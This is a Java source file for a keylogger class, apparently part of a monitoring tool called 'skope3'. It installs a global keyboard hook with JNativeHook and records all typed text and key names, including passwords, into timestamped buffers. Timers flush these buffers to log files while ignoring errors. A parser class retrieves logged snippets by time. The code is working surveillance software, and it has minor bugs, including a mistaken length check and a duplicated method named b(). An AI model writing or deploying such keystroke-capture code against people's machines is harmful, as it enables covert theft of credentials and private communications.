package com.gundersoft.skope3;

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Calendar;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Timer;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 * A Wrapper class for JNativehook that runs two separate key log buffers, one
 * reading literal text, the other reading key names into a semicolon delimited
 * list.
 * @author Christian Gunderman
 */
public class Keylogger {
    /** Stores whether or not this Keylogger is active */
    private boolean enabled;
    /** Buffer containing the text represenatation of the key log. */
    private StringBuilder textBuffer;
    /** Buffer containing the key press representation of the key log. */
    private StringBuilder keyBuffer;
    /** File to flush text buffer to */
    private String textLogFile;
    /** File to flush key buffer to */
    private String keyLogFile;
    /** The instance of Event class that will be called when a button is pressed. */
    private Event eventHandler;
    /** Timer instance that tags the log to allow for organized searching */
    private Timer tagTimer;
    /** Delay between each time stamp on a snippet of key log */
    private int timeStampMillis;
    /** Delay between flushing the buffers to a file. */
    private int flushMillis;
    /** Length of text buffer at last tag, prevents empty tags */
    private int previousTagTextBufferLen;
    /** Length of key buffer at last tag, prevents empty tags */
    private int previousTagKeyBufferLen;
	
    /**
     * Initialized JNativeHook System and creates Keylogger object.
     * @throws NativeHookException Throws this exception if unable to get
     * a valid keyboard hook going.
     */
    public Keylogger(Event eventHandler, String textLogFile, String keyLogFile, 
		     int timeStampMillis, int flushMillis) throws NativeHookException {
	this.textBuffer = new StringBuilder();
	this.keyBuffer = new StringBuilder();
	GlobalScreen.registerNativeHook();
	this.eventHandler = eventHandler;
	this.textLogFile = textLogFile;
	this.keyLogFile = keyLogFile;
	this.timeStampMillis = timeStampMillis;
	this.flushMillis = flushMillis;
	this.previousTagTextBufferLen = 0;
	this.previousTagKeyBufferLen = 0;
	this.tagTimer = new Timer();
	GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {
		@Override
		public void nativeKeyPressed(NativeKeyEvent e) {
		    keyPressed(e);
		}

		@Override
		public void nativeKeyReleased(NativeKeyEvent e) {
				
		}

		@Override
		public void nativeKeyTyped(NativeKeyEvent e) {
		    keyTyped(e.getKeyChar());
		}
	    });
		
	// place first tag at beginning of file
	Calendar currentTime = Calendar.getInstance();
	Keylogger.this.textBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
	Keylogger.this.keyBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
    }
	
    public void setEnabled(boolean enabled) {
	this.enabled = enabled;
	if(this.enabled) {
			
	    // schedule tagging timer
	    this.tagTimer.scheduleAtFixedRate(new TimerTask() {
		    @Override
		    public void run() {
			Calendar currentTime = Calendar.getInstance();
			if(Keylogger.this.textBuffer.length() != previousTagTextBufferLen) {
			    Keylogger.this.textBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
			    previousTagTextBufferLen = Keylogger.this.textBuffer.length();
			}
			if(Keylogger.this.textBuffer.length() != previousTagKeyBufferLen) {
			    Keylogger.this.keyBuffer.append('\1' + Long.toString(currentTime.getTimeInMillis()) + '\2');
			    previousTagKeyBufferLen = Keylogger.this.keyBuffer.length();
			}
		    }
				
		}, this.timeStampMillis, this.timeStampMillis);
			
	    // schedule flushing timer
	    this.tagTimer.scheduleAtFixedRate(new TimerTask() {
		    @Override
		    public void run() {
			// write to file, if there is one
			try {
			    Keylogger.this.flushBuffers();
			} catch (IOException e) {
			    // do nothing
			}
		    }
		}, 0, this.flushMillis);
	} else {
			
	    // stop tagging and flush timer
	    this.tagTimer.purge();
			
	    // flush buffers
	    try {
		this.flushBuffers();
	    } catch (IOException e) {
		// fail silently
	    }
	}
    }
	
    public boolean isEnabled() {
	return this.enabled;
    }
	
    /**
     * Clear keylog buffers and writes to the log files, if 
     * they were given when the Keylogger was created.
     * @throws IOException 
     */
    public void flushBuffers() throws IOException {
		
	// write text buffer
	if(this.textLogFile != null && this.textBuffer.length() > 0) {
	    FileWriter logFile = new FileWriter(this.textLogFile, true);
	    if(logFile != null) {
		logFile.append(this.getLiteralText());
		logFile.close();
	    }
	}
		
	// write key press buffer
	if(this.keyLogFile != null && this.keyBuffer.length() > 0) {
	    FileWriter logFile = new FileWriter(this.keyLogFile, true);
	    if(logFile != null) {
		logFile.append(this.getKeyBuffer());
		logFile.close();
	    }
	}
		
	// clear text buffers
	this.textBuffer = new StringBuilder();
	this.keyBuffer = new StringBuilder();
	this.eventHandler.buffersFlushed();
    }
	
    /**
     * Gets the text that would appear as the keys on the 
     * keyboard are typed.
     * @return A String containing the keylog.
     */
    public String getLiteralText() {
	return this.textBuffer.toString();
    }
	
    /**
     * Gets length of literal text buffer.
     * @return An integer value of the number of characters in
     * the literal text buffer.
     */
    public int getLiteralTextLength() {
	return this.textBuffer.length();
    }
	
    /**
     * Gets buffer of ALL keys pressed since last buffer flush.
     * @return The keys pressed, separated by semi colons.
     */
    public String getKeyBuffer() {
	return this.keyBuffer.toString();
    }
	
    /**
     * Gets length of the key buffer.
     * @return An integer value of the number of characters in
     * the key press buffer.
     */
    public int getKeyBufferLength() {
	return this.keyBuffer.length();
    }
	
    /**
     * Release Native hook.
     */
    public void destroy() {
	GlobalScreen.unregisterNativeHook();
	this.tagTimer.cancel();
    }
	
    /**
     * Called when a key is pressed.
     */
    private void keyPressed(NativeKeyEvent e) {
	if(this.enabled) {
	    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
	    keyBuffer.append(keyText + "; ");
	    this.eventHandler.keyPressed();
	}
    }
	
    /**
     * Called when a key is typed.
     * @param key
     */
    private void keyTyped(char key) {
	if(this.enabled) {
	    if(key == '\b') {
		//if(textBuffer.length() > 0 && key != '\1' && key != '\2')
		//	textBuffer.deleteCharAt(textBuffer.length() - 1);
		textBuffer.append("[Backspace]");
	    } else
		textBuffer.append(key);
	    this.eventHandler.keyTyped();
	}
    }
	
    /**
     * Interface that triggers outside event when a keylogger event
     * happens.
     */
    public interface Event {
	public void keyPressed();
		
	public void buffersFlushed();
		
	public void keyTyped();
    }
	
    /**
     * Special Subclass that loads a Keylogger database file and creates a linked
     * list of snippets, taken at specific times. Use methods of this object to
     * get the log in its entirety, or just significant pieces of it.
     */
    public static class LogParser {
	/** Catalog of Key log snippets */
	private LinkedList<LogEntry> catalog;
		
	// TODO: Error check constructor.
	/**
	 * Creates the LogParser object from the given log file.
	 * @param logFile The file to open as the log file.
	 * @throws IOException Thrown if unable to find/open the 
	 * given log file name.
	 */
	public LogParser(String logFile) throws IOException {
	    this.catalog = new LinkedList<LogEntry>();
	    FileReader reader = new FileReader(logFile);
	    if(reader != null) {
		boolean leftBracketReached = false;
		boolean bodyReached = false;
		int b = 0;
		Calendar date = null;
		StringBuilder buffer = new StringBuilder();
		while((b = reader.read()) != -1) {
		    char c = (char) b;
		    if(c == '\1') {
			if(bodyReached && date != null) {
			    catalog.add(new LogEntry(date, buffer.toString()));
			    buffer = new StringBuilder();
			}
			leftBracketReached = true;
		    } else if(c == '\2') {
			date = Calendar.getInstance();
			date.setTimeInMillis(Long.parseLong(buffer.toString()));
			leftBracketReached = false;
			bodyReached = true;
			buffer = new StringBuilder();
		    } else if(leftBracketReached || bodyReached)
			buffer.append(c);
		}
				
		if(buffer.length() > 0) {
		    if(bodyReached && date != null) {
			catalog.add(new LogEntry(date, buffer.toString()));
			buffer = new StringBuilder();
		    }
		}
		reader.close();
	    }
	}
		
	/**
	 * Get the log in its entirety in plain String form.
	 * @return The current log file.
	 */
	public String getEntireLog() {
	    StringBuilder buffer = new StringBuilder();
	    for(LogEntry l : this.catalog) {
		buffer.append(l.text);
	    }
	    return buffer.toString();
	}
		
	/**
	 * Gets all log snippets within the given time window of the specified
	 * date.
	 * @param A Calendar object representing a time to search for relevant
	 * snippets from.
	 * @param timeWindowMillis Time window in milliseconds within which a
	 * snippet must have been taken to be considered relevant.
	 * @return The text from this snippet.
	 */
	public String getRelevantLog(Calendar date, int timeWindowMillis) {
	    StringBuilder buffer = new StringBuilder();
	    for(LogEntry l : this.catalog) {
		if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		   < (timeWindowMillis / 2)) {
		    buffer.append(l.text);
		}
	    }
			
	    if(buffer.length() > 0)
		return buffer.toString();
	    else
		return null;
	}
		
	/**
	 * Gets the date of the first snippet in the given file.
	 * This SHOULD be the oldest snippet if the file was not
	 * hand modified.
	 * @return The Date of the oldest file.
	 */
	public Calendar getFirstDate() {
	    if(this.catalog.size() > 0)
		return this.catalog.getFirst().date;
	    else 
		return null;
	}
		
	/**
	 * Gets the date of the last snippet in the given file.
	 * This SHOULD be the newest snippet if the file was not
	 * hand modified.
	 * @return The Date of the newest snippet.
	 */
	public Calendar getLastDate() {
	    if(this.catalog.size() > 0)
		return this.catalog.getLast().date;
	    else 
		return null;
	}
		
	/*
	 * TODO: Revise this crappy function below. Not sure if end index
	 * is even correct at all and it has unneccessary nesting, but will 
	 * do for now.
	 */
	/**
	 * Gets the index of the first character of the sequence of log snippets
	 * within the provided time window of the given date.
	 */
	public int[] getRelevantLogRange(Calendar date, int timeWindowMillis) {
	    int[] interval = new int[2];
	    interval[0] = -1;
	    int index = 0;
	    Iterator<LogEntry> iterator = this.catalog.iterator();
	    while(iterator.hasNext()) {
		LogEntry l = iterator.next();
				
		// if not located start index yet
		if(interval[0] == -1) {
		    if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		       < (timeWindowMillis / 2)) {
			interval[0] = index;
		    }
		} else {
		    while(iterator.hasNext() && (Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
						 < (timeWindowMillis / 2))) {
			index += iterator.next().text.length();
		    }
						
		    interval[1] = index;
		    return interval;
		}
				
		// add length of current string to current index
		index += l.text.length();
	    }
	    return null;
	}
		
	/**
	 * Gets the index of the first character of the sequence of log snippets
	 * within the provided time window of the given date.
	 */
	public int[] b(Calendar date, int timeWindowMillis) {
	    int[] interval = new int[2];
	    interval[0] = -1;
	    int index = 0;
	    Iterator<LogEntry> iterator = this.catalog.iterator();
	    while(iterator.hasNext()) {
		LogEntry l = iterator.next();
				
		// if not located start index yet
		if(interval[0] == -1) {
		    if(Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
		       < (timeWindowMillis / 2)) {
			//return index;
			interval[0] = index;
		    }
		} else {
		    while(iterator.hasNext() && (Math.abs(l.date.getTimeInMillis() - date.getTimeInMillis())
						 < (timeWindowMillis / 2))) {
			index += iterator.next().text.length();
		    }
						
		    interval[1] = index;
		    return interval;
		}
				
		// add length of current string to current index
		index += l.text.length();
	    }
	    return null;
	}
		
	/**
	 * A container class that holds log entries in the linked List.
	 */
	public static class LogEntry {
	    /** The Date upon which the snippet was taken. */
	    Calendar date;
	    /** The text of the snippet */
	    String text;
			
	    /**
	     * Constructs a log entry.
	     * @param date The Date upon which the snippet was taken.
	     * @param text The Snippet Text.
	     */
	    public LogEntry(Calendar date, String text) {
		this.date = date;
		this.text = text;
	    }
	}
    }
}
